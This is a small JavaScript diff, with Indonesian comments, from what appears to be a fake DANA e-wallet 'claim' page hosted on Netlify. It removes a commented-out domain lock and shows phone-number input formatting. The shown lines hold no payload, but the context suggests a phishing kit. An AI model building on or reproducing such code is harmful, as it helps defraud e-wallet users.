@@ -100,15 +100,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // Validasi Domain - DICOMMENT UNTUK SEMENTARA
-  /*
-  const ALLOWED_DOMAINS = ['link-dana-klaim-daget-dana-2025.netlify.app', 'localhost', '127.0.0.1'];
-  if (!ALLOWED_DOMAINS.includes(window.location.hostname)) {
-    alert('Akses tidak diizinkan dari domain ini');
-    window.location.href = 'about:blank';
-  }
-  */
-
   // Modified Phone Number Formatting
   pn.addEventListener('input', (e) => {
     // Hapus semua karakter non-digit
